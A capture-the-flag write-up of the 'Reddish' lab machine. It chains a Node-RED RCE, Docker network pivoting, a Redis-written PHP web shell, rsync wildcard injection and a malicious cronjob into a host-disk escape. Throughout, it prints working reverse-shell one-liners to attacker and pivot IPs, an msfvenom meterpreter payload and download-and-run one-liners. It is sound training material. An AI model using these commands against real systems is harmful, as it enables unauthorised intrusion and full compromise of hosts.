+++
date = '2026-07-18T17:30:32+02:00'
draft = false
title = 'Reddish Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`18/07/2026`**

![Reddish.jpeg](/images/imgs_reddish/Reddish.jpeg)

---
# Introduction

**_Reddish_** is an **Insane-level Linux** box that heavily focuses on internal network mapping, advanced pivoting, and Docker container breakouts.

The exploitation path starts with gaining initial access via a vulnerable **Node-RED** instance. Once inside the first container, the difficulty shifts to enumerating the internal **Docker** network.
The lateral movements require abusing a **Redis** instance to write a malicious **PHP** file into a shared folder, gaining code execution on a separate web container. From there, a **Wildcard expansion** via **rsync** leads to **root** access inside the web container. Finally, an **Rsync** misconfiguration is abused to upload a malicious cronjob to a backup container, allowing me to pivot once more and mount the host's physical drive to read the **root flag**.

---
# Techniques Used

- **Node-RED RCE**

- **Internal Network Pivoting & Port Forwarding**

- **Redis Arbitrary File Write**

- **Rsync Wildcard Expansion**

- **Cronjob Hijacking**

- **Docker Container Breakout**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- reddish
```

```text
PORT     STATE SERVICE
1880/tcp open  vsat-control
```

**Open ports**:

- **1880**/tcp - Node-RED / Web

## Web Enumeration

Visiting the application on port **1880** returned a simple "**`Cannot GET /`**" message.

![browser.png](/images/imgs_reddish/browser.png)

After launching **gobuster** against the web server, I tried interacting with requests issuing a **`POST`** request via **curl**:

```bash
curl -X POST http://reddish:1880
```

![curl.png](/images/imgs_reddish/curl.png)

Browsing to **`http://reddish:1880/red/420145ed5986d48d8b85490d3a376a8a`** revealed a **Node-RED** instance.

![nodered.png](/images/imgs_reddish/nodered.png)

**Note**: _According to the official **Nodered** website, **Node-RED** is a flow-based development platform designed to simplify integration between systems, APIs, services, and devices through a visual interface. Originally created by **IBM** and currently maintained by the **OpenJS Foundation**, **Node-RED** is widely used in automation, Internet of Things (**IoT**), service integration, and data orchestration scenarios._

---
# Initial Access | Node-RED RCE

By searching online, I found an article explaining a known **RCE** vulnerability in **Node-RED**:
- **`https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/`**

**Note**: _By default, **Node-RED** doesn't require authentication. This means anyone can interact with the visual interface and drag-and-drop an "**`exec`**" node into the flow to execute arbitrary system commands on the underlying server._

I initially tried to use that public **Python** exploit, but I wasn't able to get it working. 

![script_fail.png](/images/imgs_reddish/script_fail.png)

So, I decided to build the exploit manually using the **Node-RED** visual interface.

I set up a simple flow:
- **`inject block`** ➔ **`exec block`** (running the **id** command) ➔ **`debug block`**.

![nouser.png](/images/imgs_reddish/nouser.png)

![id_rce.png](/images/imgs_reddish/id_rce.png)

I noticed a very interesting behavior: if I appended **`msg.payload`**, the command was executed as the current user, but if I ran it without appending, the command executed as **root**:
I confirmed this by successfully reading the **`/etc/passwd`** file.

![passwd.png](/images/imgs_reddish/passwd.png)

Since I had **RCE**, I tried to get a full reverse shell directly from the web interface. And, after playing a lot with the various blocks to understand the functioning, I created a new flow:
- **`tcp input block`** ➔ **`exec block`** ➔ **`tcp output block`**.

I set the first **TCP block** to connect to my **IP**. In the exec block, I inserted the classic bash reverse shell: 
- **`bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port>&1"`**.
Then, I set the **TCP output** to "**`reply to tcp`**".

![rev_fail1.png](/images/imgs_reddish/rev_fail1.png)

I triggered the flow multiple times. I was actually getting a connection back on my listener, but the shell was broken. Whenever I typed a command, I immediately received a "**`Connection refused`**" error:

![rev_fail2.png](/images/imgs_reddish/rev_fail2.png)

At this point, seeing that the manual reverse shell was continuously dropping, I decided to go back, retry the initial **Python** exploit, and debug it properly.

Executing the script threw several **`asyncio` deprecation warnings** and crashed entirely with a **JSON parsing error**:

```python
python3 scr.py http://reddish:1880/red/420145ed5986d48d8b85490d3a376a8a
[+] Node-RED does not require authentication.
[+] Establishing RCE link ....
> id
Traceback (most recent call last):
  File "/home/fallingstar/HTB/Machines/Reddish/scr.py", line 254, in exploit
    if "topic" in message and message["topic"] == "debug":
                              ~~~~~~~^^^^^^^^^
TypeError: string indices must be integers, not 'str'
```

To fix this quickly, I used an **AI** to debug the error. It modified the script's parsing logic to correctly extract the output data from the nested JSON object:

![scriptcorrection.png](/images/imgs_reddish/scriptcorrection.png)

With the fixed exploit, the web socket connection stabilized and I established a reliable **RCE** link. 

```bash
python3 noderedsh.py http://reddish:1880/red/420145ed5986d48d8b85490d3a376a8a
```

![rce.png](/images/imgs_reddish/rce.png)

From there, I executed my **bash** one-liner and successfully caught the shell on my **netcat** listener:

![rootnod.png](/images/imgs_reddish/rootnod.png)

I was inside the first **Docker** container (**`node-red`**) as **root**.

---
# Internal Network Enumeration

Checking the network interfaces with **`ip a`**, I discovered the internal subnet: **`172.19.0.0/16`**.

![ipa.png](/images/imgs_reddish/ipa.png)

I started with a very rough method to map the internal network: a simple manual **ping sweep**.

```bash
ping -c 3 172.19.0.1
ping -c 3 172.19.0.2
ping -c 3 172.19.0.3
ping -c 4 172.19.0.4
```

![pings.png](/images/imgs_reddish/pings.png)

They were all alive, except for the **`.5`** which didn't respond. At this point, I needed proper tools to see what was running on these hosts, so I switched to **Metasploit**. 

I generated a malicious **meterpreter payload** locally:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.77 LPORT=22667 -f elf >> fall.sh
```

![payload.png](/images/imgs_reddish/payload.png)

Then, since I lacked basic tools like **curl**, **wget**, or **nc** on this container, I transferred it using a quick **`Node.js`** one-liner:

**Note**: _This choice wasn't random. Knowing that I was inside a **Docker** container running a **Node-RED** instance, **node** had to be installed by definition. Instead of guessing what else might be on the system, I simply searched how to perform a file transfer using **`Node.js`** and found this handy one-liner._

```bash
node -e "const http = require('http'); const fs = require('fs'); const file = fs.createWriteStream('fall.sh'); http.get('http://10.10.16.77:8000/fall.sh', function(response) { response.pipe(file); });"
```

![nodetransfer.png](/images/imgs_reddish/nodetransfer.png)

![meterpreter.png](/images/imgs_reddish/meterpreter.png)

Once the **Meterpreter** session was established, I mapped the internal network properly using **`/post/multi/manage/autoroute`** and ran the **`scanner/portscan/tcp`** module against **`172.19.0.0/24`**.

```text
msf auxiliary(scanner/portscan/tcp) > run 
[*] 172.19.0.0            - Scanned 1 of 1 hosts (100% complete)
[+] 172.19.0.2            - 172.19.0.2:6379 - TCP OPEN
[+] 172.19.0.3            - 172.19.0.3:1880 - TCP OPEN
[+] 172.19.0.4            - 172.19.0.4:80 - TCP OPEN
```

I did a quick **Google** search for port **6379** and confirmed it is the default TCP port used by a **Redis** server.

**Target Mapping**:

- **`172.19.0.3`** - **Current Node-RED container** (**1880**)

- **`172.19.0.2`** - **Redis server** (**6379**)

- **`172.19.0.4`** - **Web server** (**80**)

---
# Lateral Movement | Redis Exploitation → Web RCE

I could have used **Metasploit** to forward the port, but as usual, I prefer to do things manually. I downloaded a static **ncat** binary, transferred it via **`Node.js`**, and connected directly to **Redis**:

```bash
chmod +x ncat 
./ncat 172.19.0.2 6379
```

![ncat_redis.png](/images/imgs_reddish/ncat_redis.png)

Now I was completely stuck. I searched for **CVEs** related to **Redis** but found nothing directly exploitable. I spent some time playing around with its facilities; I knew I could **create keys**, **rename files**, and **change paths**, but nothing clicked.

So, I took a step back and decided to investigate the other internal machine: the web server on **`172.19.0.4`**.
To reach it, I used the **Node-RED** application on my browser. I set up a flow: 
- **`http input (/fall)`** ➔ **`http request (http://172.19.0.4:80)`** ➔ **`http response`**.

![httpinput.png](/images/imgs_reddish/httpinput.png)
![httpreq.png](/images/imgs_reddish/httpreq.png)

After clicking deploy, I reached the internal **web server** at:
- **`http://reddish:1880/api/<id>/fall`**.

![webserver.png](/images/imgs_reddish/webserver.png)

Inspecting the source code, I noticed a huge hint—a **TODO** list left by the developers:

![sourcecodehint.png](/images/imgs_reddish/sourcecodehint.png)

This was the key for the **RCE**. The web server and the database container (**Redis**) shared the same **web folder** (**`/var/www/html/`**). Since the web server runs **PHP** and I had access to **Redis**, I could use it to create a malicious file and drop it into the **web folder**.

```bash
./ncat 172.19.0.2 6379
SET cmd "<?php echo SYSTEM($_REQUEST['rce']) ?>"
config set dbfilename "fall.php"
config set dir "/var/www/html"
save
```

![redisexploit.png](/images/imgs_reddish/redisexploit.png)

I appended **`fall.php?star=whoami`** to the **HTTP** request on **Node-RED**, deployed it, and finally got the output of **`whoami`**.

![noderedrce.png](/images/imgs_reddish/noderedrce.png)
![noderedrce2.png](/images/imgs_reddish/noderedrce2.png)

To get a proper shell, I sent a **URL-encoded** reverse shell payload:

```text
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F22666%200%3E%261%27
```

Listening on my **`node-red`** container, I caught the reverse shell as **`www-data`**.

![wwwcontainer.png](/images/imgs_reddish/wwwcontainer.png)

**Note**: _This was one of the first really tricky pivoting points. It caused me quite a few headaches. As we will see later in the box, there is a cronjob running on the **`www`** container that periodically wipes the entire contents of **`/var/www/html/`**, meaning our **PHP** shell gets constantly deleted. **Small hint I discovered while doing this**: if your shell gets wiped, you don't need to re-issue all the **Redis** commands to recreate it. The **Redis** configuration stays in memory, so you can simply type **`save`** again in your **ncat** session to instantly drop the **PHP** file back into the web directory._

---
# Privilege Escalation | Rsync Wildcard Expansion

Inside the **`www`** container, I enumerated the file system and found three users in **`/home`**: 
- **`bergamotto`**
- **`lost+found`**
- **`somaro`**.

Digging deeper, after hours of local enumeration, I discovered a **`backup.sh`** script located inside the **`/backup`** folder executed by **root**:

![privescvuln.png](/images/imgs_reddish/privescvuln.png)


First, I tried to simply connect to the **rsync share** to see if I could read or write anything, but it refused the connection because I didn't have the right permissions.
However, the use of the **wildcard** **`.rdb`** in the script made it vulnerable to **Wildcard Expansion**. To abuse this, I started a **netcat** listener on **`node-red`** and created two specific files to inject arguments into the command execution:

```bash
echo "stars" > '-e sh test.rdb';
echo "bash -c 'bash -i >& /dev/tcp/172.19.0.4/22555 0>&1'" > test.rdb
```

**Note**: _When the cronjob executes the script, the Bash shell expands the **`*.rdb` wildcard** before passing the arguments to **rsync**. It replaces the **wildcard** with the names of all matching files in the current directory.
Because I created a file literally named **`-e sh test.rdb`**, the expanded command executed by the system actually becomes:_
- _**`rsync -a -e sh test.rdb test.rdb rsync://backup:873/src/rdb/`**_

_In **rsync**, the **`-e`** flag is used to specify the remote shell program (**usually SSH**). By injecting **`-e sh test.rdb`**, we force **rsync** to use our file **`test.rdb`** as the shell executable._

![privesc.png](/images/imgs_reddish/privesc.png)

When the cronjob ran the script, **rsync** interpreted my files as flags. I caught the connection back and I was now **root** on the **`www`** container. 

![userflag.png](/images/imgs_reddish/userflag.png)

In **`/home/somaro`**, I grabbed the **user flag**.

---
# Container Breakout | Cronjob Hijacking → Host root

Now that I was **root** on the web container, I had the permissions to connect to **rsync**.

```bash
rsync -v rsync://backup:873/src/backup/
rsync -v rsync://backup:873/src/
rsync -v rsync://backup:873/src/docker-entrypoint.sh .
```

![rsync.png](/images/imgs_reddish/rsync.png)

I downloaded **`docker-entrypoint.sh`** to see what was going on inside the **`backup`** container:

```bash
cat docker-entrypoint.sh
```

![entrypoint.png](/images/imgs_reddish/entrypoint.png)

The script clearly showed that **`service cron start`** was executed when the docker started. This meant that if I could create a cronjob, I could pivot to the **`backup`** container.

To do so, I had to create a tunnel. I transferred **socat** to the **`node-red`** container to forward the traffic to my Kali machine:

```bash
node -e "const http = require('http'); const fs = require('fs'); const file = fs.createWriteStream('socat'); http.get('http://10.10.16.77:8000/socat', function(response) { response.pipe(file); });"
./socat TCP4-LISTEN:1234,fork TCP4:10.10.16.77:1234 &
```

**`Node.js`** wasn't present on the **`www`** container.

**Note**: _This was another major roadblock. I didn't have **`wget`**, **`curl`**, **`nc`**, and this time I didn't even have **`node`** to fall back on for file transfers. I spent a good amount of time enumerating the available binaries, before finally realizing that **`perl`** was actually installed on the system._

So I used it to fetch **ncat** through the tunnel:

```bash
perl -e 'use File::Fetch;$url="http://172.19.0.3:1234/ncat";$ff=File::Fetch->new(uri => $url);$file=$ff->fetch() or die $ff->error;'
chmod +x ncat
```

![ncatpivot.png](/images/imgs_reddish/ncatpivot.png)

Then, I crafted the malicious cronjob file locally and used **rsync** to push it to the remote **`backup`** container's **`/etc/cron.d/`** folder:

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/172.19.0.4/8888 0>&1'" > fall;
rsync -v fall rsync://backup:873/src/etc/cron.d/fall
```

I checked if the **rsync** command worked properly:

```bash
rsync -v rsync://backup:873/src/etc/cron.d/
```

I set up a listener on **`www`** and received a connection back as **root** on the backup container.

![rsync2.png](/images/imgs_reddish/rsync2.png)

I couldn't see the root flag anywhere and I realised I was still trapped inside a container.

![rootflagfail.png](/images/imgs_reddish/rootflagfail.png)

So, I inspected the physical **hard disks** in **`/dev`**:

![devsda.png](/images/imgs_reddish/devsda.png)

By mounting **`/dev/sda2`**, I finally escaped the **Docker** environment, accessed the underlying host file system, and grabbed the **root flag**.

```bash
ls -lha /dev/sd*
mount /dev/sda1 /mnt  # nothing here
mount /dev/sda2 /mnt
cd /mnt/root
cat root.txt
```

![rootflag.png](/images/imgs_reddish/rootflag.png)

---
# Final Thoughts

Aside from the IPs getting all messed up whenever you revert the machine, an absolute masterpiece of a box. **_Reddish_** is a pure routing and pivoting nightmare in the best way possible.

Having to bounce between **Node-RED**, **Metasploit** autorouting, **Redis**, and **Rsync** while keeping track of multiple **Docker** containers requires a lot of organization. The exploit path flows perfectly: from a classic **RCE** to exploiting a shared folder between containers, followed by wildcard expansions, and ultimately abusing **rsync** configurations to upload cronjobs.

The completion badge with the rarity tag **`0.04% of users`** is the perfect reward after 3 days of pure hell.

![badge.jpeg](/images/imgs_reddish/badge.jpeg)